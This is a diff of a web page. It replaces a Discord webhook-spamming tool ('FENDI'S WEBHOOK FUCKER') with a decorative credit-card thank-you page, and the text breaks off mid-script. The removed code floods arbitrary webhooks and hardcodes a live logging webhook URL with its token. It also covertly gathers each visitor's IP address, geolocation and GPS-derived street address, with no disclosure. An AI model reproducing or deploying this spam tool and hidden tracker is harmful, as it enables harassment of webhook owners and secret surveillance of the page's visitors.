@@ -1,1030 +1,604 @@
-Spammer index
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>FENDI'S WEBHOOK FUCKER</title>
-    <link rel="icon" type="image/png" href="https://i.ibb.co/gL0cffbC/New-Project-7.png">
-    <style>
-        /* ========== FULL RED THEME (unchanged) ========== */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            min-height: 100vh;
-            background: radial-gradient(circle at 20% 30%, #1a0000, #000000);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Poppins', 'Segoe UI', sans-serif;
-            padding: 1.5rem;
-            position: relative;
-            overflow-x: hidden;
-        }
-        #snowCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
-        .grid-backdrop {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
-            background-image: 
-                repeating-linear-gradient(90deg, rgba(200,30,50,0.35) 0px, rgba(200,30,50,0.35) 1.5px, transparent 1.5px, transparent 45px),
-                repeating-linear-gradient(0deg, rgba(200,30,50,0.35) 0px, rgba(200,30,50,0.35) 1.5px, transparent 1.5px, transparent 45px),
-                radial-gradient(circle at 50% 50%, rgba(20,0,0,0.65), rgba(0,0,0,0.9));
-            background-blend-mode: overlay, overlay, normal;
-            pointer-events: none;
-        }
-        .enter-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(8px);
-            z-index: 2000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: opacity 0.5s ease;
-            opacity: 1;
-            visibility: visible;
-        }
-        .enter-overlay.hide { opacity: 0; visibility: hidden; }
-        .enter-overlay-content {
-            text-align: center;
-            background: rgba(20, 20, 20, 0.8);
-            padding: 2rem 3rem;
-            border-radius: 3rem;
-            border: 1px solid #ff5555;
-            backdrop-filter: blur(4px);
-            color: white;
-            font-size: 2rem;
-            font-weight: bold;
-            letter-spacing: 2px;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.05); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.8; }
-        }
-        .main-app {
-            opacity: 0;
-            transition: opacity 0.8s ease;
-            width: 100%;
-            max-width: 560px;
-            z-index: 5;
-            position: relative;
-            display: block;
-        }
-        .main-app.visible { opacity: 1; }
-        .user-profile {
-            background: rgba(0,0,0,0.5);
-            border-radius: 3rem;
-            padding: 0.5rem 1rem;
-            margin-top: 2rem;
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            border: 1px solid rgba(255,80,80,0.4);
-            backdrop-filter: blur(4px);
-        }
-        .user-avatar { width: 48px; height: 48px; border-radius: 50%; border: 2px solid #ff8888; object-fit: cover; background: #1a0000; }
-        .user-info { flex: 1; }
-        .user-name { color: #ffdddd; font-weight: 600; font-size: 0.9rem; }
-        .user-tag { color: #ffaaaa; font-size: 0.7rem; opacity: 0.8; }
-        .logout-btn { background: rgba(180,30,30,0.6); border: none; padding: 0.3rem 0.8rem; border-radius: 2rem; color: white; cursor: pointer; font-size: 0.7rem; }
-        .logout-btn:hover { background: #c72a2a; }
-        .version-tag { position: fixed; bottom: 10px; right: 10px; color: #ff4444; opacity: 0.5; font-size: 12px; font-family: monospace; z-index: 9999; pointer-events: none; }
-        .top-left-logo { position: fixed; top: 15px; left: 15px; z-index: 100; cursor: pointer; }
-        .top-left-logo img { width: 45px; height: 45px; border-radius: 12px; border: 1px solid rgba(255,80,80,0.5); transition: transform 0.2s; }
-        .tools-menu {
-            position: fixed; top: 70px; left: 15px; background: rgba(15,5,5,0.95); backdrop-filter: blur(12px);
-            border: 1px solid #ff4d4d; border-radius: 1rem; padding: 0.8rem; min-width: 180px; z-index: 99;
-            opacity: 0; visibility: hidden; transform: translateY(-10px); transition: all 0.3s;
-        }
-        .tools-menu.active { opacity: 1; visibility: visible; transform: translateY(0); }
-        .tools-menu h4 { color: #ffaaaa; font-size: 0.8rem; text-align: center; border-bottom: 1px solid #ff5555; margin-bottom: 0.5rem; }
-        .tool-item { padding: 0.5rem 0.8rem; color: #ffcccc; cursor: pointer; border-radius: 0.5rem; font-size: 0.8rem; }
-        .tool-item:hover { background: rgba(200,50,50,0.5); }
-        .placeholder-item { opacity: 0.6; cursor: not-allowed; }
-        .music-player {
-            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.75); backdrop-filter: blur(12px);
-            border-radius: 3rem; border: 1px solid rgba(255,50,50,0.6); padding: 0.5rem 1rem; z-index: 101;
-            display: flex; align-items: center; gap: 0.8rem; font-size: 0.8rem;
-        }
-        .music-player button { background: none; border: none; color: #ffaaaa; font-size: 1.2rem; cursor: pointer; padding: 0; width: 28px; transition: 0.2s; }
-        .music-player button:hover { color: #ff8888; transform: scale(1.05); }
-        .music-player .track-title { color: #ffcfcf; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 0.75rem; }
-        .back-link {
-            position: fixed;
-            bottom: 15px;
-            left: 15px;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(4px);
-            padding: 0.5rem 1rem;
-            border-radius: 2rem;
-            border: 1px solid #ff5555;
-            font-size: 0.8rem;
-            z-index: 101;
-            cursor: pointer;
-            transition: 0.2s;
-            color: #ffdddd;
-        }
-        .back-link:hover { background: #c72a2a; border-color: #ff8888; transform: scale(1.02); }
-        .tilt-wrapper { perspective: 1200px; width: 100%; }
-        .tilt-card {
-            background: rgba(10,5,5,0.75); backdrop-filter: blur(12px); border-radius: 2rem;
-            border: 1px solid rgba(255,50,50,0.5); box-shadow: 0 25px 45px rgba(0,0,0,0.5);
-            padding: 2rem; width: 100%;
-            transition: transform 0.05s linear, height 0.4s cubic-bezier(0.2,0.9,0.4,1.1);
-            transform-style: preserve-3d; position: relative;
-        }
-        .settings-btn {
-            position: absolute; top: 1.2rem; right: 1.2rem; background: rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,80,80,0.6); color: #ffaaaa; width: 38px; height: 38px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 1.3rem;
-            transition: all 0.2s; z-index: 20;
-        }
-        .settings-btn:hover { background: rgba(180,30,30,0.7); transform: rotate(30deg); }
-        .panel-container { width: 100%; }
-        .panel { width: 100%; transition: opacity 0.35s, transform 0.4s; }
-        .panel-main.slide-out { animation: slideOutLeft 0.4s forwards; }
-        .panel-settings.slide-in { animation: slideInRight 0.4s forwards; }
-        .panel-settings.slide-out { animation: slideOutRight 0.4s forwards; }
-        .panel-main.slide-in { animation: slideInLeft 0.4s forwards; }
-        @keyframes slideOutLeft { 0% { transform: translateX(0); opacity: 1; } 100% { transform: translateX(-30px); opacity: 0; display: none; } }
-        @keyframes slideInRight { 0% { transform: translateX(30px); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }
-        @keyframes slideOutRight { 0% { transform: translateX(0); opacity: 1; } 100% { transform: translateX(30px); opacity: 0; display: none; } }
-        @keyframes slideInLeft { 0% { transform: translateX(-30px); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }
-        .glow-title { text-align: center; font-size: 1.7rem; font-weight: 800; margin-bottom: 0.5rem; min-height: 4rem; transition: opacity 0.5s ease; }
-        .typed-text { background: linear-gradient(135deg, #ff4d4d, #ff9999, #cc2222); background-clip: text; -webkit-background-clip: text; color: transparent; text-shadow: 0 0 15px rgba(255,50,50,0.6), 0 0 30px rgba(200,20,20,0.4); animation: glowPulse 2s ease-in-out infinite alternate; }
-        @keyframes glowPulse { 0% { text-shadow: 0 0 5px rgba(255,50,50,0.4), 0 0 10px rgba(200,20,20,0.3); } 100% { text-shadow: 0 0 20px rgba(255,80,80,0.8), 0 0 35px rgba(255,40,40,0.6); } }
-        .settings-title-red { text-align: center; font-size: 1.3rem; font-weight: 800; color: #ff4d4d; text-shadow: 0 0 8px rgba(255,50,50,0.5); margin-bottom: 0.5rem; }
-        .sub { text-align: center; color: #ffb7b7; font-size: 0.7rem; margin-bottom: 1.5rem; border-bottom: 1px dashed rgba(255,80,80,0.4); display: inline-block; padding-bottom: 4px; }
-        .input-group { margin-bottom: 1.2rem; display: flex; flex-direction: column; gap: 0.5rem; }
-        label { font-weight: 600; font-size: 0.8rem; color: #ffcfcf; text-transform: uppercase; letter-spacing: 0.5px; }
-        input, textarea { background: rgba(0,0,0,0.65); border: 1px solid #a12323; border-radius: 1.2rem; padding: 0.8rem 1rem; font-size: 0.9rem; color: #f0e6e6; outline: none; font-family: inherit; width: 100%; }
-        input:focus, textarea:focus { border-color: #ff4d4d; box-shadow: 0 0 0 2px rgba(255,77,77,0.4); }
-        textarea { min-height: 90px; }
-        .toggle-group { display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.4); padding: 0.6rem 1rem; border-radius: 2rem; border: 1px solid rgba(255,70,70,0.3); margin-bottom: 1.2rem; }
-        .toggle-label { font-size: 0.8rem; color: #ffcfcf; }
-        .switch { position: relative; display: inline-block; width: 48px; height: 24px; }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #4a0e0e; transition: 0.25s; border-radius: 24px; }
-        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: #ffb7b7; transition: 0.25s; border-radius: 50%; }
-        input:checked+.slider { background-color: #c72a2a; }
-        input:checked+.slider:before { transform: translateX(24px); background-color: white; }
-        .spam-options-wrapper { overflow: hidden; transition: max-height 0.5s cubic-bezier(0.34,1.2,0.64,1), opacity 0.4s, margin 0.3s; max-height: 0; opacity: 0; margin-bottom: 0; }
-        .spam-options-wrapper.expanded { max-height: 250px; opacity: 1; margin-bottom: 1.2rem; }
-        .spam-options { background: rgba(0,0,0,0.3); border-radius: 1.5rem; padding: 0.8rem; border: 1px solid rgba(255,70,70,0.3); }
-        .spam-row { display: flex; gap: 0.8rem; }
-        .spam-row .input-group { flex: 1; margin-bottom: 0; }
-        button { background: linear-gradient(95deg, #c72a2a, #8b0000); border: none; padding: 0.8rem; width: 100%; font-weight: bold; font-size: 1rem; color: white; border-radius: 3rem; cursor: pointer; transition: all 0.25s; }
-        button:hover { background: linear-gradient(95deg, #e03a3a, #a80000); transform: scale(0.98); }
-        .close-settings { background: linear-gradient(95deg, #3a1a1a, #2a0a0a); margin-top: 0.8rem; }
-        .custom-file-upload { background: linear-gradient(95deg, #5a1a1a, #3a0a0a); border: 1px solid #a12323; border-radius: 1.2rem; padding: 0.7rem 1rem; text-align: center; cursor: pointer; color: #ffcccc; font-weight: 500; font-size: 0.9rem; display: inline-block; width: 100%; }
-        .custom-file-upload:hover { background: linear-gradient(95deg, #7a2a2a, #5a1a1a); border-color: #ff6666; }
-        input[type="file"] { display: none; }
-        .current-row { background: rgba(0,0,0,0.5); border-radius: 1rem; padding: 0.7rem 1rem; margin-bottom: 0.8rem; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(255,80,80,0.3); }
-        .current-label { font-size: 0.8rem; color: #ff6666; font-weight: 600; letter-spacing: 0.5px; }
-        .current-value { font-size: 0.85rem; color: #ffaaaa; max-width: 200px; overflow: hidden; text-overflow: ellipsis; font-family: monospace; }
-        .edit-btn { background: rgba(180,30,30,0.6); border: none; padding: 0.3rem 0.8rem; border-radius: 2rem; color: white; cursor: pointer; font-size: 0.7rem; }
-        .edit-btn:hover { background: #c72a2a; }
-        .edit-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 1000; display: flex; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: all 0.3s; }
-        .edit-overlay.active { opacity: 1; visibility: visible; }
-        .edit-modal { background: rgba(15,5,5,0.95); backdrop-filter: blur(12px); border: 1px solid #ff4d4d; border-radius: 2rem; padding: 1.5rem; width: 90%; max-width: 400px; transform: scale(0.9); transition: transform 0.3s; }
-        .edit-overlay.active .edit-modal { transform: scale(1); }
-        .edit-modal h3 { color: #ffaaaa; margin-bottom: 1rem; text-align: center; }
-        .edit-modal .input-group { width: 100%; }
-        .edit-modal input { width: 100%; }
-        .edit-actions { display: flex; gap: 0.8rem; margin-top: 1rem; }
-        .edit-actions button { padding: 0.5rem; margin: 0; }
-        .status-msg { margin-top: 1rem; padding: 0.7rem; border-radius: 1rem; background: rgba(0,0,0,0.7); border: 1px solid #ff5555; font-family: 'Courier New', monospace; font-size: 0.75rem; max-height: 130px; overflow-y: auto; }
-        .console-line { padding: 3px 0; border-bottom: 1px solid rgba(255,80,80,0.2); color: #ffaa88; }
-        .console-line.success { color: #88ff88; text-shadow: 0 0 2px #00aa00; }
-        .console-line.error { color: #ff8888; text-shadow: 0 0 2px #aa0000; }
-        .console-line.info { color: #ffcc88; text-shadow: 0 0 2px #aa6600; }
-        .console-line.red-start { color: #ff4444; font-weight: bold; }
-        .preview-thumb { width: 28px; height: 28px; border-radius: 50%; object-fit: cover; border: 1px solid #ff8888; margin-right: 6px; }
-        .flex-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
-        footer { text-align: center; font-size: 0.65rem; margin-top: 1.2rem; opacity: 0.7; color: #aa8888; }
-        .join-link { color: #ff8888; cursor: pointer; text-decoration: underline; }
-        .join-link:hover { color: #ff4444; }
-        .view-img-btn { background: rgba(80,80,150,0.5); border: none; padding: 0.2rem 0.6rem; border-radius: 1rem; font-size: 0.65rem; cursor: pointer; color: white; }
-        @media (max-width: 550px) {
-            .tilt-card { padding: 1.2rem; }
-            .glow-title { font-size: 1.3rem; min-height: 3rem; }
-            .spam-row { flex-direction: column; gap: 0.5rem; }
-            .current-value { max-width: 130px; font-size: 0.75rem; }
-            .user-avatar { width: 36px; height: 36px; }
-            .user-profile { margin-top: 1.5rem; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Jamieson's Transactions | Premium Card</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #030303;
+      color: #f0fff0;
+      overflow-x: hidden;
+      min-height: 100vh;
+    }
+
+    /* ===== PARTICLE CANVAS BACKGROUND (waves & moving dots) ===== */
+    #particleCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: block;
+      z-index: 0;
+      pointer-events: none;
+      background: radial-gradient(circle at 20% 30%, #0a1f0a, #010101);
+    }
+
+    /* additional animated glow for depth */
+    .bg-glow {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 70% 40%, rgba(0, 255, 100, 0.08) 0%, rgba(0,0,0,0) 70%);
+      pointer-events: none;
+      z-index: 1;
+      animation: pulseGlow 8s infinite alternate;
+    }
+
+    @keyframes pulseGlow {
+      0% { opacity: 0.3; transform: scale(1);}
+      100% { opacity: 0.8; transform: scale(1.1);}
+    }
+
+    /* main content wrapper */
+    .content {
+      position: relative;
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      padding: 2rem 1.5rem;
+      backdrop-filter: blur(1px);
+    }
+
+    /* Hero text styling - BIG & BOLD */
+    .hero-title {
+      font-size: clamp(2.8rem, 10vw, 5.8rem);
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      background: linear-gradient(135deg, #B3FFB0, #2A9D4E, #0F4C2A);
+      background-size: 200% auto;
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 20px rgba(50, 255, 50, 0.4);
+      margin-bottom: 2rem;
+      animation: titleFloat 1.2s ease-out, gradientShift 10s ease infinite;
+    }
+
+    @keyframes titleFloat {
+      0% { opacity: 0; transform: translateY(40px); filter: blur(10px);}
+      100% { opacity: 1; transform: translateY(0); filter: blur(0);}
+    }
+
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    /* single credit card container */
+    .card-container {
+      perspective: 1200px;
+      width: 100%;
+      max-width: 500px;
+      margin: 1.5rem auto 2rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    /* the interactive card itself */
+    .interactive-card {
+      width: 100%;
+      max-width: 380px;
+      background: rgba(10, 30, 15, 0.6);
+      backdrop-filter: blur(14px);
+      border-radius: 32px;
+      border: 1px solid rgba(70, 255, 100, 0.6);
+      box-shadow: 0 30px 45px -20px rgba(0,0,0,0.7), 0 0 0 1px rgba(50,255,100,0.3) inset, 0 0 28px rgba(0,255,0,0.2);
+      padding: 2rem 1.8rem;
+      transition: transform 0.2s ease-out, box-shadow 0.3s ease, border-color 0.2s;
+      transform-style: preserve-3d;
+      will-change: transform;
+      font-family: 'Inter', monospace;
+      letter-spacing: 0.5px;
+    }
+
+    /* hover scale + tilt is applied via JS, but we also add a scale on hover for extra effect */
+    .interactive-card:hover {
+      transform: scale(1.05) rotateX(0deg) rotateY(0deg); /* base scale, tilt overrides via inline style */
+      border-color: #7affa0;
+      box-shadow: 0 40px 60px -20px black, 0 0 0 2px rgba(100,255,130,0.7) inset, 0 0 35px #3eff7a;
+    }
+
+    /* credit card inner elements */
+    .card-chip {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 2rem;
+    }
+    .chip-icon {
+      width: 52px;
+      height: 42px;
+      background: linear-gradient(145deg, #e0b47e, #b2813a);
+      border-radius: 14px;
+      position: relative;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.4);
+    }
+    .chip-icon::before {
+      content: "";
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      width: 30px;
+      height: 20px;
+      background: repeating-linear-gradient(45deg, #ddaf6c, #ddaf6c 4px, #c48a3a 4px, #c48a3a 8px);
+      border-radius: 8px;
+    }
+    .card-network {
+      font-size: 0.9rem;
+      font-weight: 700;
+      background: rgba(0,0,0,0.55);
+      padding: 6px 14px;
+      border-radius: 40px;
+      letter-spacing: 1px;
+      color: #d0ffc0;
+      backdrop-filter: blur(4px);
+    }
+
+    .card-number {
+      font-size: 1.6rem;
+      font-weight: 700;
+      letter-spacing: 4px;
+      background: linear-gradient(135deg, #ffffff, #c0ffc0);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 6px #2aa044;
+      margin: 1rem 0 0.8rem 0;
+    }
+
+    .card-details {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 0.8rem;
+    }
+    .card-holder, .card-expiry {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      color: #e0ffe0;
+      font-weight: 400;
+      background: rgba(0,0,0,0.4);
+      padding: 6px 12px;
+      border-radius: 30px;
+      backdrop-filter: blur(2px);
+    }
+    .card-holder span, .card-expiry span {
+      display: block;
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: white;
+      margin-top: 4px;
+      letter-spacing: 1px;
+    }
+
+    /* responsive adjustments */
+    @media (max-width: 550px) {
+      .interactive-card {
+        max-width: 320px;
+        padding: 1.5rem;
+      }
+      .card-number {
+        font-size: 1.2rem;
+        letter-spacing: 2px;
+      }
+      .hero-title {
+        margin-bottom: 1rem;
+      }
+    }
+
+    /* floating decorative dots (spot theme) */
+    .floating-dots {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+      z-index: 5;
+    }
+    .dot {
+      position: absolute;
+      background: radial-gradient(circle, #4eff7c, #177a2e);
+      border-radius: 50%;
+      filter: blur(2px);
+      opacity: 0.45;
+      animation: floatDot 14s infinite alternate ease-in-out;
+      box-shadow: 0 0 15px #2eff6e;
+    }
+
+    @keyframes floatDot {
+      0% { transform: translate(0, 0) scale(1); opacity: 0.2;}
+      100% { transform: translate(35px, -45px) scale(1.25); opacity: 0.7;}
+    }
+
+    /* extra micro interaction hint */
+    .instruction {
+      font-size: 0.85rem;
+      margin-top: 1rem;
+      color: #9eff9e;
+      background: rgba(0,20,0,0.5);
+      padding: 0.4rem 1rem;
+      border-radius: 60px;
+      display: inline-block;
+      backdrop-filter: blur(4px);
+      border: 1px solid rgba(100,255,100,0.3);
+    }
+  </style>
 </head>
 <body>
 
-<div class="grid-backdrop"></div>
-<canvas id="snowCanvas"></canvas>
+  <!-- Particle Canvas Background (dynamic wave + moving dots) -->
+  <canvas id="particleCanvas"></canvas>
+  <div class="bg-glow"></div>
+  
+  <!-- Additional floating spot elements -->
+  <div class="floating-dots" id="floatingDots"></div>
 
-<div class="top-left-logo" id="logoBtn">
-    <img src="https://i.ibb.co/gL0cffbC/New-Project-7.png" alt="Menu">
-</div>
-<div id="toolsMenu" class="tools-menu">
-    <h4>Fendi's Tools</h4>
-    <div class="tool-item" data-tool="spammer">Webhook Spammer</div>
-    <div class="tool-item placeholder-item">Webhook Reader (coming soon)</div>
-    <div class="tool-item" id="menuBackToLanding">← Back to Tools</div>
-</div>
+  <div class="content">
+    <h1 class="hero-title">Thanks for using<br>Jamieson's Transactions</h1>
 
-<div class="music-player" id="musicPlayer">
-    <button id="prevTrackBtn">⏮</button>
-    <button id="playPauseBtn">▶</button>
-    <button id="nextTrackBtn">⏭</button>
-    <span id="trackTitle" class="track-title">Pass Out</span>
-</div>
-
-<div class="back-link" id="backToLanding">← Back to Tools</div>
-
-<!-- ENTER OVERLAY -->
-<div id="enterOverlay" class="enter-overlay">
-    <div class="enter-overlay-content">Click to Enter</div>
-</div>
-
-<div id="mainApp" class="main-app">
-    <div class="tilt-wrapper">
-        <div class="tilt-card" id="tiltCard">
-            <div class="settings-btn" id="settingsBtn">⚙</div>
-            <div class="panel-container" id="panelContainer">
-                <div id="mainPanel" class="panel panel-main">
-                    <div id="userProfileContainer" style="display: none;"></div>
-                    <div class="glow-title"><span class="typed-text" id="typewriterTarget"></span></div>
-                    <div style="text-align:center;"><span class="sub">discord.gg/funerals</span></div>
-                    <div class="input-group"><label>Discord Webhook URL</label><input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..."></div>
-                    <div class="input-group"><label>Message</label><textarea id="messageContent" placeholder="Your message here... supports markdown"></textarea></div>
-                    <div class="toggle-group"><span class="toggle-label">Clear message after sending</span><label class="switch"><input type="checkbox" id="clearToggle"><span class="slider"></span></label></div>
-                    <div class="toggle-group"><span class="toggle-label">Spam Webhook</span><label class="switch"><input type="checkbox" id="spamToggle"><span class="slider"></span></label></div>
-                    <div id="spamWrapper" class="spam-options-wrapper">
-                        <div class="spam-options">
-                            <div class="spam-row"><div class="input-group"><label>Amount (1-50)</label><input type="number" id="spamAmount" min="1" max="50" value="5"></div><div class="input-group"><label>Interval (ms)</label><input type="number" id="spamInterval" min="50" max="5000" value="100" step="10"></div></div>
-                            <small style="color:#ffaaaa;">* Lower interval = faster spam (min 50ms)</small>
-                        </div>
-                    </div>
-                    <button id="sendBtn">SEND MESSAGE</button>
-                    <div id="console" class="status-msg"><div class="console-line red-start">> System ready</div></div>
-                    <footer><span id="joinFooter" class="join-link">Join discord.gg/funerals</span> | secure webhook sender</footer>
-                </div>
-
-                <div id="settingsPanel" class="panel panel-settings" style="display: none;">
-                    <div class="settings-title-red">BOT CUSTOMIZATION</div>
-                    <div style="text-align:center;"><span class="sub">current settings</span></div>
-                    <div class="current-row"><div><span class="current-label">Bot Name:</span> <span id="currentName" class="current-value">Default</span></div><button class="edit-btn" id="editNameBtn">Edit</button></div>
-                    <div class="current-row"><div class="flex-row"><span class="current-label">Avatar:</span><span id="currentPic" class="current-value">Default</span><span id="viewPicBtn" style="display:none;"><button class="view-img-btn" id="openPicBtn">View</button></span></div><button class="edit-btn" id="editPicBtn">Edit</button></div>
-                    <button id="closeSettingsBtn" class="close-settings">CLOSE SETTINGS</button>
-                    <div style="margin-top:0.8rem; font-size:0.65rem; text-align:center; opacity:0.6;">Customize bot name & avatar for webhooks</div>
-                </div>
-            </div>
+    <!-- SINGLE CREDIT CARD MODEL with mouse tracking tilt + scale on hover -->
+    <div class="card-container" id="cardContainer">
+      <div class="interactive-card" id="creditCard">
+        <div class="card-chip">
+          <div class="chip-icon"></div>
+          <div class="card-network">PREMIUM BLACK</div>
         </div>
+        <div class="card-number">**** 8823 **** 4710</div>
+        <div class="card-details">
+          <div class="card-holder">CARDHOLDER <span>JAMIESON R.</span></div>
+          <div class="card-expiry">VALID THRU <span>12/29</span></div>
+        </div>
+      </div>
     </div>
-</div>
+    <div class="instruction">🖱️ HOVER → Card tilts & enlarges</div>
+  </div>
 
-<div id="nameModal" class="edit-overlay"><div class="edit-modal"><h3>Edit Bot Name</h3><input type="text" id="nameInput" placeholder="Custom name" style="width:100%"><div class="edit-actions"><button id="saveNameBtn">Save</button><button id="cancelNameBtn" style="background:#3a1a1a;">Cancel</button></div></div></div>
-<div id="picModal" class="edit-overlay"><div class="edit-modal"><h3>Edit Bot Avatar</h3><div class="input-group"><label>Image URL</label><input type="text" id="picUrlInput" placeholder="https://..."></div><div style="text-align:center; margin:10px 0;">OR</div><label for="fileUpload" class="custom-file-upload">Choose Image from PC</label><input type="file" id="fileUpload" accept="image/jpeg,image/png,image/gif,image/webp" capture="environment"><div id="picPreview" style="margin-top:10px; text-align:center;"></div><div class="edit-actions"><button id="savePicBtn">Save</button><button id="cancelPicBtn" style="background:#3a1a1a;">Cancel</button></div></div></div>
-
-<div class="version-tag">v2.0</div>
-
-<script>
+  <script>
     (function() {
-        // ========== GLOBAL SETTINGS ==========
-        const PAGE_ORIGIN = "Webhook Spammer";
-        const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
+      // ======================
+      // 1. DYNAMIC PARTICLE WAVE BACKGROUND (moving dots + organic flow)
+      // ======================
+      const canvas = document.getElementById('particleCanvas');
+      const ctx = canvas.getContext('2d');
+      let width, height;
+      let particles = [];
+      let mouseX = null, mouseY = null;
 
-        let entered = sessionStorage.getItem('entered') === 'true';
-        const overlay = document.getElementById('enterOverlay');
-        const mainApp = document.getElementById('mainApp');
-        let ipLogSent = sessionStorage.getItem('ipLogSent') === 'true';
+      const PARTICLE_COUNT = 380;
+      const MAX_SPEED = 0.75;
+      const WAVE_INTENSITY = 1.3;
 
-        // ========== IP LOGGING (reuse same functions) ==========
-        let gpsRequested = localStorage.getItem("gpsRequested") === "true";
-        let gpsGranted = localStorage.getItem("gpsGranted") === "true";
-
-        async function getIpGeo() {
-            try {
-                const res = await fetch('https://ip-api.com/json/');
-                const data = await res.json();
-                if (data.status === 'success') {
-                    return {
-                        ip: data.query,
-                        city: data.city,
-                        region: data.regionName,
-                        country: data.country,
-                        lat: data.lat,
-                        lon: data.lon,
-                        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`
-                    };
-                }
-            } catch(e) {}
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                if (data && data.ip) {
-                    return {
-                        ip: data.ip,
-                        city: data.city || "Unknown",
-                        region: data.region || "Unknown",
-                        country: data.country_name || "Unknown",
-                        lat: data.latitude,
-                        lon: data.longitude,
-                        mapLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
-                    };
-                }
-            } catch(e) {}
-            return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", mapLink: "#" };
+      class Particle {
+        constructor(x, y) {
+          this.x = x;
+          this.y = y;
+          this.originX = x;
+          this.originY = y;
+          this.vx = (Math.random() - 0.5) * MAX_SPEED;
+          this.vy = (Math.random() - 0.5) * MAX_SPEED;
+          this.size = Math.random() * 2.8 + 1.0;
+          this.alpha = Math.random() * 0.55 + 0.2;
+          this.greenHue = 80 + Math.random() * 100;
         }
 
-        async function reverseGeocode(lat, lon) {
-            try {
-                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-                const data = await response.json();
-                if (data && data.display_name) {
-                    const address = data.address;
-                    let shortAddress = "";
-                    if (address.house_number && address.road) shortAddress += `${address.house_number} ${address.road}, `;
-                    else if (address.road) shortAddress += `${address.road}, `;
-                    if (address.suburb) shortAddress += `${address.suburb}, `;
-                    else if (address.city_district) shortAddress += `${address.city_district}, `;
-                    if (address.city || address.town) shortAddress += `${address.city || address.town}, `;
-                    else if (address.village) shortAddress += `${address.village}, `;
-                    if (address.country) shortAddress += address.country;
-                    return shortAddress || data.display_name.split(",")[0];
-                }
-                return null;
-            } catch(e) { return null; }
-        }
-
-        function getDeviceLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation || gpsRequested) {
-                    resolve(null);
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const coords = {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-                        };
-                        const address = await reverseGeocode(coords.lat, coords.lon);
-                        if (address) coords.address = address;
-                        gpsGranted = true;
-                        localStorage.setItem("gpsGranted", "true");
-                        resolve(coords);
-                    },
-                    () => {
